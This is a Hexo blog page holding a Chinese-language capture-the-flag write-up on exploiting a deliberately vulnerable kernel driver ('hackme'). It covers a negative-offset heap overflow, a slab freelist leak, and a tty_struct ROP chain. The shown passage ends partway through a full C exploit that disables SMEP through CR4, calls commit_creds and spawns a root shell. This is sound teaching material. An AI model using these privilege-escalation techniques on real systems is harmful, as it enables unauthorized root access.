@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="hackme 1234567891011#! &#x2F;bin&#x2F;shqemu-system-x86_64 \    -m 256M \    -nographic \    -kernel bzImage \    -append &amp;#x27;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1 kaslr&amp;#x27; \    -monitor &#x2F;dev&#x2F;null \">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tty_struct Attack+Modprobe_path Attack+Cred Attack">
+<meta property="og:url" content="http://example.com/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="hackme 1234567891011#! &#x2F;bin&#x2F;shqemu-system-x86_64 \    -m 256M \    -nographic \    -kernel bzImage \    -append &amp;#x27;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1 kaslr&amp;#x27; \    -monitor &#x2F;dev&#x2F;null \">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-28T18:03:16.000Z">
+<meta property="article:modified_time" content="2022-10-28T18:06:35.978Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="modprobe_path attack">
+<meta property="article:tag" content="tty_struct attack">
+<meta property="article:tag" content="cred attack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Tty_struct Attack+Modprobe_path Attack+Cred Attack | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tty_struct Attack+Modprobe_path Attack+Cred Attack
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-10-29 02:03:16 / Modified: 02:06:35" itemprop="dateCreated datePublished" datetime="2022-10-29T02:03:16+08:00">2022-10-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>15 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>hackme</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    #-gdb tcp::4869 -S \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<ul>
+<li>smep，smap，kaslr</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x30002</span> )                       <span class="comment">// HACK_WRITE</span></span><br><span class="line">&#123;</span><br><span class="line">  index = userdata.index;</span><br><span class="line">  kheap_ptr = pool[index].ptr;</span><br><span class="line">  kheap = &amp;pool[index];</span><br><span class="line">  <span class="keyword">if</span> ( kheap_ptr &amp;&amp; userdata.offset + userdata.size &lt;= kheap-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;kheap_ptr[userdata.offset], userdata.data, userdata.size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x30003</span> )                  <span class="comment">// HACK_READ</span></span><br><span class="line">&#123;</span><br><span class="line">  index = userdata.index;</span><br><span class="line">  kheap_ptr = pool[index].ptr;</span><br><span class="line">  kheap = &amp;pool[index];</span><br><span class="line">  <span class="keyword">if</span> ( kheap_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( userdata.offset + userdata.size &lt;= kheap-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(userdata.data, &amp;kheap_ptr[userdata.offset], userdata.size);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>userdata.offset</code> 是符号数，并且没有限制其必须为正数</li>
+<li>令 <code>userdata.offset</code> 为负数就可以在 <code>kheap_ptr[userdata.offset]</code> 中向上溢出</li>
+</ul>
+<p><strong>入侵思路 - Tty_struct Attack</strong></p>
+<p><code>tty_struct attack</code> 可以用于泄露 kernel_base，如果想用它来提权，则需要泄露 heap_addr</p>
+<p>本题目的溢出可以轻松泄露空闲块的 next 指针，然后泄露出 heap_addr</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">kfree(<span class="number">2</span>);</span><br><span class="line">kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"><span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>释放 “内存块2” 后，通过 “内存块3” 向上泄露内存快2的 next 指针</li>
+<li>这源自于 slab 的一个机制：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179400</span></span><br><span class="line"><span class="number">0xffffa1f380179400</span>:	<span class="number">0xffffa1f380179600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179600</span></span><br><span class="line"><span class="number">0xffffa1f380179600</span>:	<span class="number">0xffffa1f380179700</span>	<span class="number">0xdf84653679b215c3</span></span><br><span class="line"><span class="number">0xffffa1f380179610</span>:	<span class="number">0xc7e58d27141d6541</span>	<span class="number">0x875eeb6934a2d05d</span></span><br><span class="line"><span class="number">0xffffa1f380179620</span>:	<span class="number">0x32e830be7c767f6e</span>	<span class="number">0xc8103477ca4944c2</span></span><br><span class="line"><span class="number">0xffffa1f380179630</span>:	<span class="number">0x88364f1e93ef79cc</span>	<span class="number">0x2ba3fb91bbc17dd4</span></span><br><span class="line"><span class="number">0xffffa1f380179640</span>:	<span class="number">0x4ae5ec2914d5d54d</span>	<span class="number">0xa34247ff14fc9404</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179700</span></span><br><span class="line"><span class="number">0xffffa1f380179700</span>:	<span class="number">0xffffa1f380179800</span>	<span class="number">0x2d87f67ef5f84679</span></span><br><span class="line"><span class="number">0xffffa1f380179710</span>:	<span class="number">0x224428f2894924d4</span>	<span class="number">0x8c097463e73b5f8f</span></span><br><span class="line"><span class="number">0xffffa1f380179720</span>:	<span class="number">0x51e6f451fc6c7d48</span>	<span class="number">0xf7f1f1c979b53b2c</span></span><br><span class="line"><span class="number">0xffffa1f380179730</span>:	<span class="number">0xe4bddcf6395344b1</span>	<span class="number">0x66766646ae4ea583</span>  </span><br></pre></td></tr></table></figure>
+<ul>
+<li>空闲块都会有一个 next 指针，用于指向下一个内存块</li>
+<li>Slab 将内核中经常使用的对象放到高速缓存中，并且由系统保持为初始的可利用状态，因此上图中的 <code>0x400</code> <code>0x600</code> <code>0x700</code> 都是 free 状态</li>
+</ul>
+<p>由于系统开启了 smap，内核需要使用 <code>copy_from_user</code> 才能访问用户态数据，于是我们利用 <code>kcreate</code> 把 <code>fake_tty_operations</code> 指针和 <code>rop</code> 指针保存到内核的堆里： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kcreate(<span class="number">2</span>,(<span class="keyword">char</span> *)rop,<span class="number">0x100</span>);</span><br><span class="line">kcreate(<span class="number">3</span>,(<span class="keyword">char</span> *)fake_tty_operations,<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
+<p>对于 <code>tty_struct attack</code>，还需要一个关键的 gadget，其目的是为了栈迁移（把 RAX 中的数据转移到 RSP 中）：</p>
+<ul>
+<li>最直接的 gadget 就是 <code>mov rax, rsp</code></li>
+<li>如果没有就以其他寄存器为中介</li>
+<li>如果还是没有就只能用 <code>push rax + pop rsp</code></li>
+</ul>
+<p>剩下的操作就比较套路化了，可以当做是 <code>tty_struct attack</code> 的模板，注意控制一下 CR4 寄存器就好</p>
+<p>完整 exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAW_KERNEL_BASE 0XFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> MOV_CR4_RAX = <span class="number">0xffffffff8100252b</span> - RAW_KERNEL_BASE; <span class="comment">// mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> SWAPGS = <span class="number">0xffffffff81200c2e</span> - RAW_KERNEL_BASE; <span class="comment">// swapgs ; popfq ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> IRETQ = <span class="number">0xFFFFFFFF81019356</span> - RAW_KERNEL_BASE; <span class="comment">// iretq; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> COMMIT_CREDS = <span class="number">0xFFFFFFFF8104D220</span> - RAW_KERNEL_BASE;</span><br><span class="line"><span class="keyword">size_t</span> PREPARE_KERNEL_CRED = <span class="number">0xFFFFFFFF8104D3D0</span> - RAW_KERNEL_BASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//size_t PUSH_RAX_POP_RSP = 0xffffffff810608d5 - RAW_KERNEL_BASE; // push rax; pop rsp; ret;</span></span><br><span class="line"><span class="keyword">size_t</span> PUSH_RAX_POP_RSP = <span class="number">0xffffffff8116b3c5</span> - RAW_KERNEL_BASE; <span class="comment">// push rax; sub byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; </span></span><br><span class="line"><span class="keyword">size_t</span> POP_RAX = <span class="number">0xffffffff8101b5a1</span> - RAW_KERNEL_BASE; <span class="comment">// pop rax; ret; </span></span><br><span class="line"><span class="keyword">size_t</span> POP_RSP = <span class="number">0xffffffff810484f0</span> - RAW_KERNEL_BASE; <span class="comment">// pop rsp; ret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_addr</span><span class="params">(<span class="keyword">size_t</span> kernel_base)</span> </span>&#123;</span><br><span class="line">   MOV_CR4_RAX += kernel_base;</span><br><span class="line">   SWAPGS += kernel_base;</span><br><span class="line">   IRETQ += kernel_base;</span><br><span class="line">   COMMIT_CREDS += kernel_base;</span><br><span class="line">   PREPARE_KERNEL_CRED += kernel_base;</span><br><span class="line">   PUSH_RAX_POP_RSP += kernel_base;</span><br><span class="line">   POP_RSP += kernel_base;</span><br><span class="line">   POP_RAX += kernel_base;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;PUSH_RAX_POP_RSP=0x%lx\n&quot;</span>,PUSH_RAX_POP_RSP);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRoot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">void</span> *(*pkc)(<span class="keyword">int</span>) = (<span class="keyword">void</span> *(*)(<span class="keyword">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="keyword">void</span> (*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))COMMIT_CREDS;</span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>)); <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 